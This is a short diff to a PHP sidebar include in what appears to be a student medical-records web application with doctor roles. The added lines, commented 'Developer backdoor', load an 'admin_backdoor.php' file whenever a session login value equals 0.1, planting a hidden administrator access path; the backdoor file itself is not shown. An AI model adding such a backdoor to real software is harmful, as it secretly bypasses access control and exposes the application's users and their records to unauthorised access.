@@ -10,6 +10,12 @@
         {
             $append = "../";
         }
+         //Developer backdoor.
+        if ($_SESSION['login'] == 0.1)
+        {
+            include($append . 'includes/admin_backdoor.php');
+        }
+        
         switch ($_SESSION['position']) {
             case "doctor": //Display links if user has doctors access.
                 echo '<a id="btnSidebar" href="/inb201/home.php">Home</a>';
